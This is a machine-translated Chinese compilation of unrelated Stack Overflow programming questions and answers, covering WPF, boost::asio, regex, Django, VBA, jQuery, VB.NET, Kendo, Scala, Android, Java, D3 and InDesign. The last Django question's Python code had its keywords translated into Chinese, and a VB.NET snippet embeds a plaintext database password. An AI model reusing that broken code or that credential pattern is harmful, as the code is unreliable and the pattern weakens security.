好吧，人们争论。构建系统是开始一场激烈的战争的好方法。我们很难就一个标准达成一致，尽管一些常见元素现在围绕 Maven 工件很好地解决了。

至于一遍又一遍地下载互联网的需要，这是一个相当长的故事，但这里有几件事可能会引发不必要的下载需求：

*   任何使用 SNAPSHOT 的依赖项都会尝试获取最新的快照。这是一个伟大的计划，但它需要付出代价。您可能依赖于依赖于快照的东西，并因此获得下载。

*   Maven 不会重新下载工件，但有时会检查 md5。这很容易解决，只需使用命令行中的 -O 选项即可。

像 Buildr 这样的工具是围绕一劳永逸地解决这个问题而构建的。首先，您只下载您所说的内容。其次，除非您要求，否则不会再次建立连接。默认情况下，Buildr 不玩传递依赖游戏，尽管您可以要求它，但您必须明确地这样做。

我希望这是有用的，并且您在 Java 土地上的旅程将变得不那么痛苦。

# wpf - 当 WPF TextBox 获得焦点时，如何轻松更改其样式？

> ID：15244145
> 
> 赞同：4
> 
> 时间：2013-03-06T10:01:01.157
> 
> 标签：wpf, templates, textbox, styles

我的 WPF 应用程序中有一个 TextBox，背景颜色为*"Blue"*。当它获得焦点时，默认情况下背景颜色变为*“白色”*。当 TextBox 获得焦点时，我希望背景颜色具有另一种颜色（例如*"DodgerBlue"*）。

我在网上能找到的都是样式或模板的惊人示例，它们定义了 TextBox 的所有可能的 VisualStates。

是否无法创建仅针对特定情况的简短模板（即当 TextBox 具有焦点时）？

谢谢。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-03-06T10:08:12.000

您可以使用简单的样式触发器：

```
<TextBox>
        <TextBox.Style>
            <Style TargetType="{x:Type TextBox}">
                <Style.Triggers>
                    <Trigger Property="IsFocused" Value="True">
                        <Setter Property="Background" Value="Tomato" />
                    </Trigger>
                </Style.Triggers>
            </Style>
        </TextBox.Style>
    </TextBox> 
```

那应该做...

# c++ - 使用 C++ 的 TCP IP 通信

> ID：15244148
> 
> 赞同：0
> 
> 时间：2013-03-06T10:01:09.057
> 
> 标签：c++, tcp, boost-asio

我试图在 C++ 中使用 boost::asio 创建一个 TCP/IP 客户端。我创建了一个函数来创建一个连接到服务器的套接字

```
 void TCP_IP_Communication::Create_Socket()

    {
     ...
   _socket = new tcp::socket(_io); //create socket

  _io.run();

 boost::system::error_code error= boost::asio::error::host_not_found;

try
{
while (error && endpoint_iterator != end) //if error go to next endpoint
    {
      _socket->close();
      _socket->connect(*endpoint_iterator++, error);
    }
 //if error throw error

if(error)
    throw boost::system::system_error(error);

//else the router is connected
boost::asio::read_until(*_socket,buf,'\n');

}} 
```

然后我使用另一个函数/线程来发送命令并接收响应。

```
try
{
    if(p=='i')

             _socket->send(boost::asio::buffer(" sspi l1\n\n")); //sending signal presence for input command

        else

        _socket->send(boost::asio::buffer(" sspo l1\n\n")); //sending signal presence for output command

    for(; ;)  //loop reading all values from router
  {

    //wait for reply??

        boost::asio::read_until(*_socket,buf,'\n');

        std::istream is(&buf);
        std::getline(is,this->data);
        std::cout<<std::endl<<this->data; 
```

问题是，每次我连接到服务器时，它都会给出响应

```
? "login" 
```

但是当我发送命令时，我需要抑制它。实际上它不应该出现，因为我每次发送命令时都没有连接到服务器，但确实如此。我在这里做错了什么？我就是想不通。

主要功能是这样的：

```
int main()
{

TCP_IP_Connection router;
    router.Create_Socket();
    boost::thread router_thread1,router_thread2;
    router_thread1=boost::thread(&TCP_IP_Connection::get_status,&router,'i'); 
    router_thread1.join();
    std::string reply="\nend of main()";
    std::cout<<reply;
    return 0;
} 
```

# javascript - javascript正则表达式仅删除完整的单词

> ID：15244152
> 
> 赞同：0
> 
> 时间：2013-03-06T10:01:21.010
> 
> 标签：javascript, regex

我尝试在 javascript 上使用正则表达式来删除一些不需要的单词。例如，我的基本字符串是 1。“David Guetta avi！” 2.“大卫·盖塔 avi bla bla” 3.“大卫·盖塔的 avi”

如您所见，我想删除“avi”，在第一个字符串中，avi 由空格和感叹号包裹，第二个字符串由空格包裹，第三个由空格包裹，仅在右侧。

如果我使用 .replace(/avi/s,''); 它也会从大卫（将是 Dd）中删除 avi。我需要编写正则表达式的帮助，它将删除未被符号包裹或包裹的特定单词（还有空格斜杠）。

谢谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:05:27.397

您是否尝试过使用单词边界特殊字符？所以正则表达式是：

```
\b<word>\b 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:04:22.960

关于什么

```
\W\avi\W{0,1} 
```

`\W`代表任何非单词字符。

你也可以试试

```
[^a-zA-Z]avi[^a-zA-Z]{0,1} 
```

`[^a-zA-Z]`什么地方**没有**`a-zA-Z`。_

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T12:09:37.973

我已将@Evan 答案组合成符号删除正则表达式 + 双倍空格删除，最终答案是：

`mystring.replace(/[^\w\s]|\bavi\b|\s{2,}/gi,'');`

谢谢你们 ：）

# python - 使用 python/django 关闭套接字并避免 Errno 10054 的正确方法是什么

> ID：15244153
> 
> 赞同：2
> 
> 时间：2013-03-06T10:01:25.297
> 
> 标签：python, django, unit-testing, selenium

我正在使用[django-selenium](https://django-selenium.readthedocs.org/en/latest/#)在我参与的 django 应用程序上运行 Selenium 测试。这个 django 应用程序使用 Qt 和本地网络服务器在本地运行。

所以要运行测试，我需要启动应用程序的服务器、selenium 服务器，然后是 webdriver 实例来执行测试。

django-selenium 用 a 设置它的服务器，`subprocess.Popen('java -jar <path_to_server.jar>')`然后如果服务器没有运行，我同样为应用程序运行我们的网络服务器；

```
def run():
    path = os.path.join(os.getcwd(), 'main.py')
    server_running = is_server_running()

    if server_running is False:
        subprocess.Popen(['python', path, '-a']) 
```

现在在测试设置中看起来像这样；

```
def setUp(self):
    self.server = Process(target= startServer.run)
    self.server.start() 
```

并拆解；

```
def tearDown(self):
    # stop our server
    self.ff.get('http://localhost:{0}/QUIT'.format(settings.LISTEN_PORT))
    # stop the selenium server
    self.ff.get('http://localhost:4444/selenium-server/driver/?cmd=shutDownSeleniumServer')
    # close the browser
    self.ff.quit()
    self.server.terminate() 
```

现在在这样做时，我得到一个`error: [Errno 10054] An existing connection was forcibly closed by the remote host`. 我尝试`sleep`在调用之间添加以关闭连接，但这没有帮助。

你能看出我可能在哪里犯了错误吗？我认为如果关闭来自远程主机，那么如果我先关闭我们的服务器，然后关闭 selenium 服务器，然后在服务器关闭后终止进程，那么应该不会有问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-08-21T15:30:34.257

我也遇到了这个问题，我通过在退出前刷新浏览器来修复它。（是的，很奇怪，我知道）。尝试在之前添加此行`self.ff.quit()`：

```
self.ff.refresh()
self.ff.quit() 
```

这为我解决了这个问题，虽然我不知道为什么。

# vba - 是否拥有包含指向其他人的链接的工作簿会影响其中的 VBA 代码？

> ID：15244154
> 
> 赞同：0
> 
> 时间：2013-03-06T10:01:25.780
> 
> 标签：vba

我有一个工作簿，它使用单元格中的值来生成 Prophet 中使用的表格。如果我没有在单元格中有值，而是有指向其他工作簿的链接，这会影响 VBA 代码吗？有什么我需要注意的问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:52:19.113

不会对您的宏产生影响。

Excel 存储值以及链接。因此，即使没有刷新链接或缺少“链接到”工作簿，仍然有一个值要返回。

无论链接状态如何，这段代码都将返回单元格值。

```
A1 = Range("A1").Value 
```

最大的危险是用户不刷新链接，在这种情况下，您可能会使用旧值。您的用户也可以断开将链接从公式转换为值的链接。

# jquery - 改变几个背景图像

> ID：15244157
> 
> 赞同：0
> 
> 时间：2013-03-06T10:01:35.103
> 
> 标签：jquery

嗨，我目前正在尝试整理我的一些代码：

```
 $('#b1').css('background-image', 'url("site_images/05/1.png")');
    $('#b2').css('background-image', 'url("site_images/05/2.png")');
    $('#b3').css('background-image', 'url("site_images/05/3.png")');
    $('#b4').css('background-image', 'url("site_images/05/4.png")');
    $('#b5').css('background-image', 'url("site_images/05/5.png")');
    $('#b6').css('background-image', 'url("site_images/05/6.png")');
    $('#b7').css('background-image', 'url("site_images/05/7.png")'); 
```

它工作得很好，但想知道是否有更好的选择或方法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T10:06:48.290

像这样的东西：

```
var i;
for ( i = 1; i <= 7; i++ ) {
  $('#b' + i).css('background-image', 'url("site_images/05/' + i + '.png")');
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-06T10:07:39.710

`images`向所有`b1,b2,b3`..等人分配一个班级（比如说）

然后：

```
$(".images").each(function(){
   $(this).css('background-image', 'url("site_images/05/" + this.id.replace("b","") + ".png")');
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T10:07:06.377

```
for(var i=1; i<=7; i++){
 $('#b'+i).css('background-image', 'url("site_images/05/'+i+'.png")');
} 
```

请注意，`i`如果您在代码中的其他地方使用它，这将释放变量 - 范围仅对 for 循环是本地的

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-06T10:13:45.703

替代：

如果这些元素有父元素，您可以简单地使用 CSS 并将特定类添加到父元素。

```
html.bg_switched #bg1 { 
    background-image: url("site_images/05/1.png");
}

html.bg_switched #bg2 { 
    background-image: url("site_images/05/2.png");
}
... 
```

然后：

```
$('html').addClass('bg_switched'); 
```

或者这种程度的东西。

# sql - 使用查询将数据库连接到 vb 代码中的数据表

> ID：15244160
> 
> 赞同：0
> 
> 时间：2013-03-06T10:01:46.577
> 
> 标签：sql, database, vb.net

我想使用选择查询连接数据库中的表。页面上已经建立了连接字符串`web.config`。

```
<connectionStrings>
    <add name="IntranetConnectionString" connectionString="Data Source=nanana\sql5;Initial Catalog=Intranet;User ID=intra_admin;password=jimfool" providerName="System.Data.SqlClient"/>
</connectionStrings> 
```

我想创建一个名为 GetList 的函数，只要我想绑定信息，我就可以在其中使用它。这是我的VB代码

```
Public Function GetList() As DataTable
    Dim Query As String
    Dim dt As DataTable
    Query = "Select * FROM Intranet_Gn_ISCoordinators"

    'I need to write something here ..
    'dt = 
    Return dt
End Function 
```

我是大人物，在此先感谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:45:09.463

您可以使用[SqlDataAdapter](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqldataadapter.aspx?cs-save-lang=1&cs-lang=vb#code-snippet-2)：

```
Imports System.Configuration
Imports System.Data
Imports System.Data.SqlClient

Public Function GetList() As DataTable

    Dim Query As String = "Select * FROM Intranet_Gn_ISCoordinators"
    Dim dt As DataTable = New DataTable()

    Using adapter = New SqlDataAdapter(Query, ConfigurationManager.ConnectionStrings["IntranetConnectionString"].ConnectionString)
        adapter.Fill(dt)
        return dt
    End Using

End Function 
```

* * *

*顺便说一句，我意识到查询可能只是一个示例，但`SELECT *`在生产代码中通常是一个坏主意。明确列出您想要的列*

# javascript - iPad 上的 Colorbox：缩放后交互中断

> ID：15244162
> 
> 赞同：1
> 
> 时间：2013-03-06T10:01:55.530
> 
> 标签：javascript, jquery, css, ipad, colorbox

我偶然发现了 iPad 上的颜色框有一个烦人的问题：打开颜色框并缩放后，颜色框内的交互元素似乎被破坏了。

这可以在此[示例网页 (http://www.jacklmoore.com/colorbox/example1/)](http://www.jacklmoore.com/colorbox/example1/)上重复：

1.  在 iPad 上打开颜色框
2.  放大颜色框
3.  尝试通过单击关闭按钮关闭

我正在使用带有 jQ​​uery 版本 v1.9.1 和 colorbox 版本 v1.3.34 的 iPad 2（iOS 版本 6）。

# asp.net-mvc-3 - 关于 mvc3 中的 kendo ui 上传

> ID：15244163
> 
> 赞同：1
> 
> 时间：2013-03-06T10:02:01.083
> 
> 标签：asp.net-mvc-3, razor, kendo-ui, telerik-mvc

我想在 mvc3 中使用 kendo ui q2 2012。我使用这个链接的方式：

[http://docs.kendoui.c​​om/documentation/getting-started/using-kendo-with/aspnet-mvc/introduction](http://docs.kendoui.com/documentation/getting-started/using-kendo-with/aspnet-mvc/introduction)

但在我的剃刀视图中，而不是显示这个：

```
 @(Html.Kendo().Upload()
            .Name("files")
        ) 
```

它显示了这一点：

```
@Kendo.Mvc.UI.Upload 
```

我不能使用它。帮助请。谢谢...

另一个问题是我可以在 mvc3 中使用 Telerik.Web.UI 吗？当我将它添加到我上面所说的相同剑道的项目中时，它不显示 htmlHelper 类型。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T12:15:41.250

您可以查看[上传概述帮助主题](http://docs.kendoui.com/getting-started/using-kendo-with/aspnet-mvc/helpers/upload/overview)。它展示了如何在 ASP.NET MVC 中配置和使用 Kendo Upload。以下是相关代码：

查看（剃刀）：

* * *

```
@(Html.Kendo().Upload()
        .Name("attachments")
        .Async(async => async
            .Save("Save", "Home")
        )
) 
```

控制器：

* * *

```
public ActionResult Save(IEnumerable<HttpPostedFileBase> attachments)
{
    // The Name of the Upload component is "attachments"
    foreach (var file in attachments)
    {
        // Some browsers send file names with full path. We only care about the file name.
        var fileName = Path.GetFileName(file.FileName);
        var destinationPath = Path.Combine(Server.MapPath("~/App_Data"), fileName);

        file.SaveAs(destinationPath);
    }

    // Return an empty string to signify success
    return Content("");
} 
```

# scala - 类型类子类化

> ID：15244168
> 
> 赞同：1
> 
> 时间：2013-03-06T10:02:18.677
> 
> 标签：scala, typeclass, discriminated-union, subtype

我想限制联合类型`A`和`B`类型的参数，其中`B`一些通用类型将被子类型化。我想把对象放在这个方法中：

```
def accept[A](a:A)(implicit ev:FooOrBaish[A]){ /* do something */} 
```

这是，我如何指定隐式：

```
case class Foo(i:Int)
trait Baish
case object Bar extends Baish
case class Baz(x:String) extends Baish
class FooOrBaish[A]
object FooOrBaish{
  implicit object FooWit extends FooOrBaish[Foo]
  implicit object BaishWit extends FooOrBaish[Baish]
} 
```

现在，我可以放入 accept ，但`Foo(5)`不能放在那里，编译器尖叫：。我在哪里可以指定子类型关系？`Baz("a")``Bar``error: could not find implicit value for parameter ev: FooOrBaish[Baz]`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:20:24.027

将 FooOrBaish 的类型更改为逆变的并且它可以工作

```
class FooOrBaish[-A] 
```

# java - Jxls 输出 excel 文件与输入模板文件格式不同

> ID：15244169
> 
> 赞同：2
> 
> 时间：2013-03-06T10:02:18.527
> 
> 标签：java, jxls

嗨，我正在使用 jxls 生成 excel 表，我的问题是在 o/p 表中我得到了额外的行，还有一些边框样式。为了进一步参考，我在这里添加了两张图片

![在此处输入图像描述](../Images/4284bd66dfe89c2078da2899dae2dbf2.png)

![在此处输入图像描述](../Images/5f38283c0a9a4ed29db6535d33c576c5.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T10:39:03.073

您是否尝试过使用 foreach 标签？这应该防止创建额外的行：

```
<jx:forEach items="${collection_name}" var="collection_var">
${collection_var.PROPERTY_NAME}
</jx:forEach> 
```

# c# - 以下 POST 的 HttpWebRequest uri 是什么

> ID：15244173
> 
> 赞同：1
> 
> 时间：2013-03-06T10:02:23.987
> 
> 标签：c#, httpwebrequest

我尝试使用 HttpWebRequest 将数据发布到以下内容。但是我不确定以下任务的 URI 应该是什么

```
POST /v1/session  
Host: developer.messenger.yahooapis.com    
Authorization: < Standard OAuth credentials >    
Content-Type: application/json;charset=utf-8  
Content-Length: 38    
{        
  "presenceState" : 0,      
  "presenceMessage" : "I am now logged in"   
} 
```

我有这样的东西

```
string uri = "https://developer.messenger.yahooapis.com/v1/session  ";
 HttpWebRequest request = (HttpWebRequest) WebRequest.Create(uri); 
```

对于所需的帖子，该 uri 是否正确。

# websphere-7 - 问题“爆炸位置与现有部署重叠”（MyEclipse 10.0 Blue & Websphere7）

> ID：15244174
> 
> 赞同：1
> 
> 时间：2013-03-06T10:02:24.453
> 
> 标签：websphere-7, myeclipse

我正在使用 MyEclipse 10.0 Blue & Websphere7。我从“服务器”选项卡（窗口>显示视图>服务器）在eclipse中进行部署

即使 Websphere 没有特别的耳朵，我也遇到了以下问题。

```
"Exploded location overlaps an existing deployment" 
```

有什么建议可以解决这个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-08T05:03:22.823

我解决了这个问题。在 MyEclipse Blue 10.0 IDE 中执行以下步骤：

1.  从 Window > Preferences > WebSphere 7.0 中删除 WebSphere 配置文件（服务器实例）
2.  通过选择 WebSphere 主目录（Windows > Preferences > WebSphere 7.0）再次重新加载配置文件
3.  清理项目
4.  要在 WebSphere 中部署您的项目 ear/war，请转到 Window > show view > Servers
5.  在服务器选项卡中右键单击 WebSphere 7
6.  从“添加部署...”进行部署
7.  选择您的项目并完成它

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-12T08:53:55.980

我刚刚在 MyEcliplseBlue 9 中遇到了这个问题，我通过确保项目确实从位置 AppSrv01/installedApps/(node name)/ 删除了配置文件，然后停止 WAS 服务器，停止并启动 IDE 来解决它，重新创建配置文件，然后我能够重新部署应用程序。

我认为缓存的内容不同步。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T19:08:07.647

Narendra，我们修复了这方面的几个错误，尤其是您在 10.x 系列的后续 MyEclipse 版本中遇到的“重叠”部署问题。

我建议更新到 MyEclipse 10.7.1。[您可以从我们的网站http://www.myeclipseide.com/module-htmlpages-display-pid-4.html](http://www.myeclipseide.com/module-htmlpages-display-pid-4.html)下载安装程序，或者在 MyEclipse 配置中心的软件选项卡中应用 10.0 安装中的更新（帮助 > MyEclipse 配置中心）。

希望这会有所帮助，布赖恩。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-03-08T13:25:10.427

我们可以在 websphere 中再创建一个配置文件。它将更新我们面临爆炸问题的部署网络信息。它为我工作了一段时间。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2014-05-19T21:57:33.103

问题：由于直接从 Deploy 目录 (%JBOSS_HOME%\server\default\deploy) 中删除了 ear/war；而不是从 IDE 中删除 ear/war。

因此请选择：

1.  服务器->右键单击（已安装的服务器）->添加部署->
2.  之前您选择了“Exploded Deployment”，现在选择“Packeged Archive”部署。
3.  部署完成后，右键单击（已部署的 ear/war）并选择“删除部署”

现在您可以使用“Exploded Archive”部署成功部署您的耳朵。*

# python - 如何在 python mayavi2 中更改字体类型？

> ID：15244176
> 
> 赞同：2
> 
> 时间：2013-03-06T10:02:27.373
> 
> 标签：python, fonts, mayavi

我发现mayavi2中只有三种字体，'arial'，'courier'，'times'。但是如何使用其他字体类型？实际上，我想设置中文字体。谢谢！

# android - 关闭活动完成对话框

> ID：15244179
> 
> 赞同：5
> 
> 时间：2013-03-06T10:02:30.267
> 
> 标签：android, android-dialog

在我的应用程序中，我有几个活动一个接一个。在我的登录屏幕之后，我有主屏幕，然后是几个屏幕。现在，当用户选择设备主页按钮或关机按钮时，我想在用户再次访问我的应用程序然后主屏幕时显示登录屏幕。休息所有活动，我正在从我的基础课程中完成它。现在到这里我已经完成了，我的问题是当我在其他一些活动中显示一个对话框时，如果用户点击主页或电源按钮，那么我得到了**WINDOW LEAKED EXCEPTION**。

![在此处输入图像描述](../Images/896d7e5c7c217f15c035bf4b9e98de8a.png)

就像我有 TempActivity 正在显示一个对话框并且用户单击了主页按钮，因此 StoreActivity 和 TempActivity 将完成但 Dialog 从未有机会被解雇。那么处理这种情况的最佳方法是什么。有没有更好的方法来关闭对话框，这样我就不会遇到任何异常。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:15:08.880

覆盖`onDestroy`，在那里，检查对话框是否存在，如果存在，则关闭它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-01-26T06:25:20.927

onDestroy() 中的 dismiss() 并不能解决这个问题。尝试覆盖 activity.finish() ，例如：

```
@Override
public void finish() {
    if(mDialog != null) {
        mDialog.dismiss();
    }
    super.finish();
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-06T10:10:30.913

将`Dialog`句柄放在成员对象中，然后当您完成最重要的活动时，首先关闭对话框。

您可以通过创建抽象`Activity`类（所有活动都扩展）来使这更整洁，这会在调用时关闭可能的对话框`finish()`

# java - 拆分数组并组织成多个数组的有效方法

> ID：15244180
> 
> 赞同：1
> 
> 时间：2013-03-06T10:02:32.700
> 
> 标签：java, android, string

我得到了一个`String[]`包含多个用户详细信息的内容。像这样的东西：

```
Wilson#$20#$Male=@=Raymond#$25#$Male=@=Sophie#$20#$Female 
```

我想将字符串拆分并将其组织成多个数组。例如一个数组为`Name`，一个数组为`Age`，另一个数组为`Gender`。到目前为止，我设法将其拆分`String[]`成这样的东西。

```
String[] User = student.split("=@=");

User[0] = Wilson#$20#$Male    
User[1] = Raymond#$25#$Male
User[2] = Sophie#$20#$Female 
```

我真的不知道如何从这一点上组织它。任何意见和答案都非常感谢！

**编辑**

```
Wilson#$20#$Male=@=Raymond#$25#$Male=@=Sophie#$20#$Female 
```

上面的部分实际上是一个从服务器返回的值，我想处理这个值。谢谢大家的回复。我想我在理论上理解了一点，但我在实现代码时遇到了一些问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:04:15.303

创建一个用户对象来存储所有字段（姓名、年龄、性别）并创建一个列表来保存所有数据。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-06T10:07:19.133

你最好的选择是使用一个对象来保存这些值。对象是在一个对象中保存彼此相关的值的标准化方法。IE：

```
public class Person
{
    private String name;
    private int age;
    private String gender;
    // Gender could be a boolean value really, but you've stored it as a String.     
} 
```

在构造函数中，您将请求每个值并将其分配给这些字段。它看起来像：

```
public Person(String name, int age, String gender)
{
    this.name = name; 
    // etc etc
} 
```

这样你就有了一个数组，不需要对字符串进行任何标记来获取单个值:)。您还需要实现一些访问器[和修改](http://java.about.com/od/workingwithobjects/a/accessormutator.htm)器来获取对象中的值。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-06T13:29:01.813

我同意为每个用户创建一个类的建议——这是面向对象的方式。所以我将它包含在下面的示例中。但是如果你想做数组或其他结构，你可能会很容易改变它。

但是，我要添加的是一种使用 Java 类`java.util.regex.Pattern`并`java.util.regex.Matcher`从输入字符串中一次性提取记录和字段的方法。（我还没有为 Android 编程，但我认为它们是可用的。）

该模式的一般计划是：（记录分隔符或无）（field1）（delim）（field2）（delim）（lastfield）（记录分隔符+输入的其余部分）

该算法基本上使用上述模式循环输入。该模式为字段提取各种组（取决于您的记录格式），然后还提取包含输入字符串其余部分的最后一个组。此余数用作下一个循环的新输入字符串。所以循环的每次迭代都会做一个记录。

这是您可以运行的更完整的示例代码。您可能需要研究正则表达式以理解模式，这是算法的重要部分。您可以从`java.util.regex.Pattern`该类的 Javadoc 开始。

```
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class TestPatternMatch {
    public static void main(String[] args) {
        List<User> result = new ArrayList<>();
        String input =
                "Wilson#$20#$Male=@=Raymond#$25#$Male=@=Sophie#$30#$Female";
        Pattern recPatt =
                Pattern.compile("^(=@=|.{0})(.+?)#\\$(\\d+)#\\$(.+?)(?==@=)(.*$)");
        //                       ^match start of line
        //                        ^match record delimiter or nothing
        //                                  ^match name field (reluctant)
        //                                       ^match field delim
        //                                           ^match age field
        //                                                 ^match field delim
        //                                   match gender field^
        // zero-width (non recording) lookahead for record delimiter^
        //                                     match rest of line until end^

        Matcher recMatcher;
        String workStr = input; // start with whole input
        while (workStr != null && workStr.length() > 0) {
            recMatcher = recPatt.matcher(workStr);
            if (recMatcher.matches() && recMatcher.groupCount() >= 5) {
                result.add(
                        new User(
                                recMatcher.group(2), //name
                                Integer.parseInt(recMatcher.group(3)), //age
                                recMatcher.group(4) //gender
                        )
                );
                workStr = recMatcher.group(5); // use tail for next iteration
            } else {
                workStr = null;
            }
        }
        System.out.println(result); //show result list contents
    }
}

class User {
    String  name;
    int     age;
    String  gender;
    /** All argument constructor */
    public User(String name, int age, String gender) {
        this.name = name;
        this.age = age;
        this.gender = gender;
    }
    /** Show contents of object fields */
    public String toString() {
        return "User ["+ name + ", " + age + ", " + gender + "]";
    }
} 
```

基本模式结构可以重复用于许多不同的记录格式。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-06T10:07:46.487

为什么不创建一个`User`类并维护一个`User`实例列表。

```
class User {

  String name;
  String gender;
  int age;

} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-06T10:09:14.083

最好的解决方案是创建一个用户类。如果您想避免它，请尝试：

```
String[] User = student.split("=@=");
String [][] details=new String[user.length][3];
String [] temp=new String[3];
for(int i=0;i<User.length;i++){
 temp=User.split("//");
  for(j=0;j<3;j++){
  details[i][j]=temp[j];
  }
} 
```

# javascript - D3从包含名称的字符串数组创建按钮

> ID：15244182
> 
> 赞同：2
> 
> 时间：2013-03-06T10:02:35.577
> 
> 标签：javascript, arrays, button, d3.js, selectall

我想在 d3 中创建几个按钮。为了有一个更清晰的代码，我想将他们的名字添加到一个数组中。

我有以下代码，但它不起作用：

```
var buttonNames = ["button 1", "button 2", "button 3", "button 4"]

d3.select("body").selectAll("input").data(buttonNames).enter().append("input").attr("type","button").attr("class","button").attr("value", function d(){return d;} ) 
```

提前感谢您的回复。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-06T10:12:53.190

您的函数定义中有错字。

```
.attr("value", function d(){return d;} ) 
```

应该

```
.attr("value", function (d){return d;} ) 
```

请注意，这`d`是函数的参数，必须在括号内。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-07-07T20:03:04.413

这就是我创建多个按钮的方式。

```
 d3.select("#some_id")
      .append("div")
      .attr("class","some_other_id")
      .each(function(d) {

    for (var i = 1; i < number_to_duplicate; i++) {
        d3.select("#some_other_id")
          .append("button")
          .attr("type","button")
          .attr("class","btn-btn")
          .attr("id",function(d) { return 'button '+i;})
          .append("div")
          .attr("class","label")
          .text(function(d) { return 'button '+i;}) 
```

我创建了一个 div 和一个 .each(function)。在函数中，for 循环创建按钮。这给了我尽可能多的按钮 - number_to_duplicate - 每个按钮都有单独的 id。当然，我可以修改它，制作更多具有相同或不同属性的按钮，将它们附加到不同的 yet_another_id 元素。

如果需要，可以在其他地方的循环之外完成标签。这是我穷人的“纽扣工厂”。请评论评论，正面或负面 - 让我学习。

# html - appcache 正在被缓存？

> ID：15244183
> 
> 赞同：1
> 
> 时间：2013-03-06T10:02:35.920
> 
> 标签：html, google-chrome, html5-appcache

当我检查谷歌浏览器的缓存文件（ chrome://appcache-internals/ ）时，我发现了这个（在其他文件中）：

```
Manifest,   http://localhost/MUHMobile/cache.appcache   1.5 kB 
```

这是否意味着我的 appcache 文件正在被缓存？我不希望它被缓存。

有人对如何不缓存此文件有任何提示吗？

# javascript - 如何在 indesign 中要求或包含脚本？

> ID：15244186
> 
> 赞同：8
> 
> 时间：2013-03-06T10:02:45.437
> 
> 标签：javascript, include, adobe, require, adobe-indesign

如何加载另一个脚本文件并在其上运行方法？

我正在使用 InDesign javascript，但我不知道如何在同一个脚本中包含多个文件。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-06T21:26:37.453

三个选项：import、app.doScript 和 $.evalFile。我更喜欢 $.evalFile。参见[app.doScript 与 $.evalFile](https://stackoverflow.com/questions/15074220/what-is-the-difference-between-app-doscript-and-evalfile)

### 工作示例：

**C:\script1.jsx**

```
(function() {
    $.evalFile(new File("/c/script2.jsx"));
    var sFullName = g_script2.combineName("John", "Doe");
    $.writeln(sFullName);
    return "Success";
})(); 
```

**C:\script2.jsx**

```
g_script2 = {
    combineName: function(sFirstName, sLastName) {
        return sFirstName + " " + sLastName;
    }
}; 
```

如果 script2.jsx 不在 C 盘根目录下，请修改脚本 1 的真实位置。

### 解释：

1.  脚本 1 创建并执行匿名函数以避免污染全局命名空间。如果它不这样做，`sFullName`将是全球性的。
2.  脚本 1 执行脚本 2。
3.  脚本 2 创建一个对象并将其存储到全局变量`g_script2`中。
4.  脚本 1 调用`combineName`脚本 2 的方法。需要注意的是，脚本的所有文件都将共享同一个全局命名空间，这也是脚本 1 可以访问的方式`g_script2`。但是，这也意味着对于一个函数或变量，任何两个文件都不应该具有相同的名称，除非它们像本例中那样保存在全局对象中。
5.  该`combineName`函数运行，并返回一个字符串。
6.  脚本 1 打印名称，然后返回“成功”。由于这是堆栈中的最后一个对象，因此它作为脚本结果返回。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-09-09T07:28:33.293

ExtendScript 提供预处理器指令以包含外部脚本。该指令将目标文件的内容插入到语句所在位置的当前脚本文件中。因此，在语句之后，您将能够调用任何方法，就像它是当前脚本的方法一样：

```
#target InDesign;    

// Include other script file that includes a function otherScriptFileMethod
#include "otherScriptFile.jsx"

// Now you can call the method as it was written in this script file
otherScriptFileMethod(); 
```

# python - Django modelformset order_by 不工作

> ID：15244190
> 
> 赞同：1
> 
> 时间：2013-03-06T10:02:55.507
> 
> 标签：python, django, django-models, django-forms

我想使用 Django (1.4) modelformset，当加载 formset 时，表单将由我在模型中的exam_date 字段排列。为此，我创建了以下简单的 BaseModelFormSet

```
类 BaseExamDateFormSet（BaseModelFormSet）：
    def __init__(self, *args, **kwargs):
        super(BaseExamDateFormSet, self).__init__(*args, **kwargs)
        self.queryset = models.ExamDate.objects.all().order_by('exam_date')

```

如您所见，我已按照 [django 文档](https://docs.djangoproject.com/en/1.4/topics/forms/modelforms/#changing-the-queryset)中的建议更改了查询集（稍后我还将更改其 clean 方法，但现在没关系）。之后，我在视图中使用它来创建表单集：

```
ExamDateFormSet = modelformset_factory(
    模型.ExamDate,
    排除 =('权限', ),
    can_delete=真，
    额外=1，
    formset = forms.BaseExamDateFormSet
)
...
formset = ExamDateFormSet()

```

我的问题是，当呈现表单集时，表单中的数据始终处于相同的顺序（通过 id 可能），而不管 order_by 属性的值如何:(

